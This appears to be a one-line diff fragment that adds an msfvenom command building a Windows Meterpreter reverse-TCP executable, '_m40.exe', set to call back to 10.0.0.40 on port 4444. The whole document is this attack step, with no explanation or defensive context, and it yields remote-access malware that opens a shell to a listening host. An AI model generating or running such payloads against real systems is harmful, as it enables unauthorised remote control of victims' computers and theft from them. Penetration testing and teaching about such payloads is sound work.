@@ -1,0 +1,2 @@
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.40 LPORT=4444 --format=exe > _m40.exe
+
